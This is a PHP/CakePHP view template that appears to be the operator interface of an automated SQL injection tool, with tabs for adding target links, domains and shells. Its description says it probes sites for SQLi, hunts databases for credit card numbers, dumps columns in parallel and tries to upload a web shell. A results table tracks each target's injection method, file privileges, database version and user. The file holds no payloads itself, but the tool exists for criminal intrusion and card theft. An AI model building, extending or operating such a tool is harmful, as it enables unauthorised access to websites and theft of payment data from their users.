<!-- START CONTENT -->
<div id="content">
<ul class="page-nav fl">

<li ><?=$html->link('STATE',array('action'=>'mailinfo')); ?></li>
<li ><?=$html->link('ADD LINKS',array('action'=>'add')); ?></li>
<li ><?=$html->link('ADD DOMENS',array('action'=>'add_domens')); ?></li>
<li> <?=$html->link('ADD SHELLS',array('action'=>'add_shells')); ?></li>
<li class="active" ><?=$html->link('SINGLE BREAKING',array('action'=>'add_one')); ?></li>
<li><?=$html->link('SINGLE DUMP',array('action'=>'dumping_all')); ?></li>

</ul>

<div class="clear"></div>

<table class="table">
<thead>
<th>ADD LINKS</th>
</thead>
<tbody>
<tr>
<td>
<label for="hash"><span>Single hacking is an independent routine for analyzing a site on sqli vulnerability in five ways. <br>Helps to search for soaps in all databases. Search for possible credit cards. Count the number in the table if you find it.<br> Dump the selected columns with a maximum speed of 6 threads through group_concat. Try to fill the shell on the domain.</span></label>
<?=$form->create('Post',array('type'=>'file'))?>
<br>
<?=$form->input('link',array('type'=>'text', 'class'=>'input','div'=>true,'label'=>'Link to vulnerable page with ? and = in links <br> '))?>
<br>
<br>
<?=$form->submit('ANALYSIS', array('name'=>'hash','class'=>'btn btn_green','div'=>false))?>
<?=$form->end()?>
<br/>
<br/>

<?=$form->create('Post',array('type'=>'file','url'=>'add_one_domen'))?>
<?=$form->input('domen',array('type'=>'text', 'class'=>'input','div'=>true,'label'=>'Spider launch domain              - '))?>
<br>
<br>

<?=$form->submit('ANALYSIS', array('name'=>'domen_sub','class'=>'btn btn_green','div'=>false))?>
<?=$form->end()?>
<br/>
<br/>

<!--
<label for="hash">Укажите домен для запуска паука:</label>
<?=$form->create('Post',array('type'=>'file'))?>
<?=$form->input('domen',array('type'=>'text', 'class'=>'input','div'=>false,'label'=>'domen'))?>
<br>

<?=$form->submit('Добавить', array('name'=>'cron','class'=>'btn btn_green','div'=>false))?>
<?=$form->end()?>
<br/>
-->

</td>
</tr>
</tbody>
</table>

<div class="clear"></div>
<? if(count($data)!=0){ ?>
<table class="table no-nowrap" width='90%'>
<thead>
<th class="center" style="width:100px;">DOMEN</th>
<th class="center" style="width:6px;">U</th>
<th class="center"style="width:25px;">HTTP</th>
<th class="center">HEADER</th>
<th class="center">COLUMN</th>
<th class="center">WORK</th>
<th class="center">METHOD</th>
<th class="center">PRIV</th>			
<th class="center" >VER</th>
<th class="center" >USER</th>
<th class="center" >CLICK</th>
</thead>
<tbody>

<? } ?>

<? if(count($data)==0){ ?>
<!--
<tr>
<td colspan="13" class="center">Нет строк для отображения</td>
</tr>
-->

<? }else{

foreach ($data as $value){ ?>

<?

$id = 			$value['id'][0];
$gurl = 		$value['gurl'][0];
$url = 			$value['url'][0];
$file_priv = 	$value['file_priv'][0];
$tic = 			$value['tic'][0];
$sposob = 		$value['sposob'][0];
$method = 		$value['find'][0];
$column =  		$value['column'][0];
$version =  	$value['version'][0];
$work =      	$value['work'][0];
$status =    	$value['status'][0];
$domen =     	$value['domen'][0];
$order =     	$value['order'][0];
$work =     	$value['work'][0];
$sleep =     	$value['sleep'][0];
$user =     	$value['user'][0];
$http =     	$value['http'][0];
$header =     	$value['header'][0];

?>

<? $f = parse_url($gurl);?>
<td class="center" style="font-size:10px;"> <div style="word-wrap: break-word;width: 130px;"><?=$domen?></div></td>
<td class="center" style="font-size:10px;"> <div style="word-wrap: break-word;width: 6px;">

<?php

if($http =='https' or $http =='https://')
{
echo $html->link('u','https://'.$url,array('target'=>'_blank'));
}
else
{
echo $html->link('u','http://'.$url,array('target'=>'_blank'));
}

?>
</div>
</td>

<td class="center" style="font-size:10px;">
<div style="word-wrap: break-word;width: 30px;">

<?
$http2 = str_replace('http://','http',$http);
echo $http2;
?>
</div>
</td>

<td class="center" style="font-size:10px;">
<div style="word-wrap: break-word;width: 30px;">

<?
if($header =='')
{
echo 'get';
}
else
{
echo $header;
}
?>

</div>
</td>

<td class="center" style="font-size:10px;"> <div style="word-wrap: break-word;width: 30px;"><?=$column?></div></td>
<td class="center" style="font-size:10px;"> <div style="word-wrap: break-word;width: 100px;"><?=$work?></div></td>
<td class="center" style="font-size:10px;"> <div style="word-wrap: break-word;width: 100px;"><?=$method?></div></td>
<td class="center" style="font-size:10px;">

<?

if($file_priv =='')
						{
							echo "NO";
						}
						elseif($file_priv =='0')
						{
							echo "NO";
						}
						elseif($file_priv =='1')
						{
							echo "YES";
						}
						elseif($file_priv =='Y')
						{
							echo "YES";
						}
?>
</td>

<td class="center" style="font-size:10px;"><?=$version; ?></td>
<td class="center" style="font-size:10px;"><?=$user; ?></td>

<td width="70">
<?=$this->Html->link($this->Html->image("curl.png", array("alt" => "START")),array('action'=>'krutaten_one/'.$id.'/load'),array('escape' => false,'class' => 'icon','title'=>'START','target'=>'_blank'))?>		
<?=$ajax->link($this->Html->image("delete.png", array("alt" => "MOVE TO BAD")), '/posts/shlak_one/'.$id,array('class'=>'icon','title'=>'MOVE TO BAD','escape' => false,'update'=>'data'.$id))?>
</td>
</tr>

<? } ?>
<? } ?>

</tbody>
</table>
</div>

<!-- STOP CONTENT -->